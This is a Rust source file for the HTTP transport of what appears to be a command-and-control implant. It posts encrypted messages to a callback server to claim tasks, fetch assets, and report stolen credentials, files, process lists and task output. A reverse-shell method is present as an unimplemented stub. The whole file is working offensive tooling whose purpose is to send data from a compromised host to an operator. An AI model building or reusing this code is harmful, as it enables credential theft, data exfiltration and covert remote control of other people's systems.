use crate::Transport;
use anyhow::{Context, Result};
use hyper::body::HttpBody;
use hyper::StatusCode;
use pb::c2::*;
use prost::Message;
use std::sync::mpsc::{Receiver, Sender};
use bytes::{Buf, BytesMut};

static CLAIM_TASKS_PATH: &str = "/c2.C2/ClaimTasks";
static FETCH_ASSET_PATH: &str = "/c2.C2/FetchAsset";
static REPORT_CREDENTIAL_PATH: &str = "/c2.C2/ReportCredential";
static REPORT_FILE_PATH: &str = "/c2.C2/ReportFile";
static REPORT_PROCESS_LIST_PATH: &str = "/c2.C2/ReportProcessList";
static REPORT_TASK_OUTPUT_PATH: &str = "/c2.C2/ReportTaskOutput";
static REVERSE_SHELL_PATH: &str = "/c2.C2/ReverseShell";

// Marshal: Encode and encrypt a message using the ChachaCodec
// Uses the helper functions exported from pb::xchacha
fn marshal_with_codec<Req, Resp>(msg: Req) -> Result<Vec<u8>>
where
    Req: Message + Send + 'static,
    Resp: Message + Default + Send + 'static,
{
    pb::xchacha::encode_with_chacha::<Req, Resp>(msg)
}

// Unmarshal: Decrypt and decode a message using the ChachaCodec
fn unmarshal_with_codec<Req, Resp>(data: &[u8]) -> Result<Resp>
where
    Req: Message + Send + 'static,
    Resp: Message + Default + Send + 'static,
{
    pb::xchacha::decode_with_chacha::<Req, Resp>(data)
}

#[derive(Debug, Clone)]
pub struct HTTP {
    client: hyper::Client<hyper::client::HttpConnector>,
    base_url: String,
}

impl HTTP {
    /// Generic helper method for unary RPC calls (request-response pattern).
    /// Handles marshaling, HTTP request/response, and unmarshaling for all unary operations.
    async fn unary_rpc<Req, Resp>(
        &mut self,
        request: Req,
        path: &str,
    ) -> Result<Resp>
    where
        Req: Message + Send + 'static,
        Resp: Message + Default + Send + 'static,
    {
        // Marshal: Encode and encrypt the request using the codec
        let request_bytes = marshal_with_codec::<Req, Resp>(request)?;

        // Build the URL
        let url = format!("{}{}", self.base_url, path);
        let uri: hyper::Uri = url.parse().context("Failed to parse URL")?;

        // Build the HTTP request
        let req = hyper::Request::builder()
            .method(hyper::Method::POST)
            .uri(uri)
            .header("Content-Type", "application/grpc")
            .body(hyper::Body::from(request_bytes))
            .context("Failed to build HTTP request")?;

        // Send the request
        let response = self
            .client
            .request(req)
            .await
            .context("Failed to send HTTP request")?;

        if response.status() != StatusCode::OK {
            return Err(anyhow::anyhow!("HTTP error: {}", response.status()));
        }

        // Read the response body
        let body_bytes = hyper::body::to_bytes(response.into_body())
            .await
            .context("Failed to read response body")?;

        // Unmarshal: Decrypt and decode the response using the codec
        let response_msg = unmarshal_with_codec::<Req, Resp>(&body_bytes)?;

        Ok(response_msg)
    }
}

impl Transport for HTTP {
    fn init() -> Self {
        let mut connector = hyper::client::HttpConnector::new();
        connector.enforce_http(false);
        connector.set_nodelay(true);
        let client = hyper::Client::builder().build(connector);
        HTTP {
            client,
            base_url: String::new(),
        }
    }

    fn new(callback: String, _proxy_uri: Option<String>) -> Result<Self> {
        // Create HTTP connector
        let mut connector = hyper::client::HttpConnector::new();
        connector.enforce_http(false); // Allow HTTPS
        connector.set_nodelay(true); // TCP optimization

        // Build HTTP client
        let client = hyper::Client::builder().build(connector);

        Ok(Self {
            client,
            base_url: callback,
        })
    }

    async fn claim_tasks(&mut self, request: ClaimTasksRequest) -> Result<ClaimTasksResponse> {
        self.unary_rpc(request, CLAIM_TASKS_PATH).await
    }

    async fn fetch_asset(
        &mut self,
        request: FetchAssetRequest,
        tx: Sender<FetchAssetResponse>,
    ) -> Result<()> {
        #[cfg(debug_assertions)]
        let filename = request.name.clone();

        // Marshal: Encode and encrypt the request using the codec
        let request_bytes = marshal_with_codec::<FetchAssetRequest, FetchAssetResponse>(request)?;

        // Build the URL
        let url = format!("{}{}", self.base_url, FETCH_ASSET_PATH);
        let uri: hyper::Uri = url.parse().context("Failed to parse URL")?;

        // Build the HTTP request
        let req = hyper::Request::builder()
            .method(hyper::Method::POST)
            .uri(uri)
            .header("Content-Type", "application/grpc")
            .body(hyper::Body::from(request_bytes))
            .context("Failed to build HTTP request")?;

        // Send the request
        let response = self
            .client
            .request(req)
            .await
            .context("Failed to send HTTP request")?;

        if response.status() != StatusCode::OK {
            return Err(anyhow::anyhow!("HTTP error: {}", response.status()));
        }

        // Stream the response body and reassemble gRPC-framed messages
        let mut body = response.into_body();
        let mut buffer = BytesMut::new();
        let mut message_count = 0;

        loop {
            // Try to read a complete gRPC frame from the buffer
            while buffer.len() >= 5 {
                // Read gRPC frame header: [compression_flag(1)][length(4)]
                let compression_flag = buffer[0];
                let message_length = u32::from_be_bytes([
                    buffer[1],
                    buffer[2],
                    buffer[3],
                    buffer[4],
                ]) as usize;

                #[cfg(debug_assertions)]
                log::debug!(
                    "Frame header: compression={}, length={} bytes",
                    compression_flag,
                    message_length
                );

                // Check if we have the complete message
                if buffer.len() < 5 + message_length {
                    // Need more data
                    break;
                }

                // Extract the complete encrypted message
                buffer.advance(5); // Skip frame header
                let encrypted_message = buffer.split_to(message_length);
                message_count += 1;

                #[cfg(debug_assertions)]
                log::debug!(
                    "Received complete encrypted message {} for {}: {} bytes",
                    message_count,
                    filename,
                    encrypted_message.len()
                );

                // Unmarshal: Decrypt and decode the complete encrypted message
                let response_msg = unmarshal_with_codec::<FetchAssetRequest, FetchAssetResponse>(
                    &encrypted_message,
                )?;

                // Send the response through the channel
                match tx.send(response_msg) {
                    Ok(_) => {}
                    Err(_err) => {
                        #[cfg(debug_assertions)]
                        log::error!(
                            "failed to send downloaded file chunk: {}: {}",
                            filename,
                            _err
                        );

                        return Err(anyhow::anyhow!("Failed to send response through channel"));
                    }
                }
            }

            // Read more data from HTTP body
            match body.data().await {
                Some(Ok(chunk)) => {
                    #[cfg(debug_assertions)]
                    log::debug!("Received HTTP chunk: {} bytes", chunk.len());

                    buffer.extend_from_slice(&chunk);
                }
                Some(Err(err)) => {
                    return Err(anyhow::anyhow!("Failed to read chunk from response: {}", err));
                }
                None => {
                    // No more data from HTTP
                    break;
                }
            }
        }

        // Check if there's leftover data in the buffer
        if !buffer.is_empty() {
            #[cfg(debug_assertions)]
            log::warn!(
                "Incomplete data remaining in buffer: {} bytes",
                buffer.len()
            );
        }

        #[cfg(debug_assertions)]
        log::debug!(
            "Completed streaming {} messages for {}",
            message_count,
            filename
        );

        Ok(())
    }

    async fn report_credential(
        &mut self,
        request: ReportCredentialRequest,
    ) -> Result<ReportCredentialResponse> {
        self.unary_rpc(request, REPORT_CREDENTIAL_PATH).await
    }

    async fn report_file(
        &mut self,
        request: Receiver<ReportFileRequest>,
    ) -> Result<ReportFileResponse> {
        // Build the URL
        let url = format!("{}{}", self.base_url, REPORT_FILE_PATH);
        let uri: hyper::Uri = url.parse().context("Failed to parse URL")?;

        // Create a channel to stream request chunks
        let (mut tx, body) = hyper::Body::channel();

        // Spawn a task to send all chunks
        tokio::spawn(async move {
            let mut chunk_count = 0;
            for req_chunk in request {
                chunk_count += 1;

                #[cfg(debug_assertions)]
                log::debug!("Sending file chunk {}", chunk_count);

                // Marshal and encrypt each chunk
                let request_bytes = match marshal_with_codec::<ReportFileRequest, ReportFileResponse>(req_chunk) {
                    Ok(bytes) => bytes,
                    Err(err) => {
                        #[cfg(debug_assertions)]
                        log::error!("Failed to marshal chunk {}: {}", chunk_count, err);
                        return;
                    }
                };

                // Write gRPC frame header: [compression_flag(1)][length(4)]
                let mut frame_header = [0u8; 5];
                frame_header[0] = 0x00; // No compression
                let len_bytes = (request_bytes.len() as u32).to_be_bytes();
                frame_header[1..5].copy_from_slice(&len_bytes);

                // Send frame header
                if tx.send_data(hyper::body::Bytes::from(frame_header.to_vec())).await.is_err() {
                    #[cfg(debug_assertions)]
                    log::error!("Failed to send frame header for chunk {}", chunk_count);
                    return;
                }

                // Send encrypted chunk
                if tx.send_data(hyper::body::Bytes::from(request_bytes)).await.is_err() {
                    #[cfg(debug_assertions)]
                    log::error!("Failed to send chunk {}", chunk_count);
                    return;
                }
            }

            #[cfg(debug_assertions)]
            log::debug!("Completed sending {} file chunks", chunk_count);
        });

        // Build the HTTP request with streaming body
        let req = hyper::Request::builder()
            .method(hyper::Method::POST)
            .uri(uri)
            .header("Content-Type", "application/grpc")
            .body(body)
            .context("Failed to build HTTP request")?;

        // Send the request
        let response = self
            .client
            .request(req)
            .await
            .context("Failed to send HTTP request")?;

        if response.status() != StatusCode::OK {
            return Err(anyhow::anyhow!("HTTP error: {}", response.status()));
        }

        // Read the response body
        let body_bytes = hyper::body::to_bytes(response.into_body())
            .await
            .context("Failed to read response body")?;

        // Unmarshal: Decrypt and decode the response using the codec
        let response_msg =
            unmarshal_with_codec::<ReportFileRequest, ReportFileResponse>(&body_bytes)?;

        Ok(response_msg)
    }

    async fn report_process_list(
        &mut self,
        request: ReportProcessListRequest,
    ) -> Result<ReportProcessListResponse> {
        self.unary_rpc(request, REPORT_PROCESS_LIST_PATH).await
    }

    async fn report_task_output(
        &mut self,
        request: ReportTaskOutputRequest,
    ) -> Result<ReportTaskOutputResponse> {
        self.unary_rpc(request, REPORT_TASK_OUTPUT_PATH).await
    }

    async fn reverse_shell(
        &mut self,
        rx: tokio::sync::mpsc::Receiver<ReverseShellRequest>,
        tx: tokio::sync::mpsc::Sender<ReverseShellResponse>,
    ) -> Result<()> {
        unimplemented!("todo")
    }
}
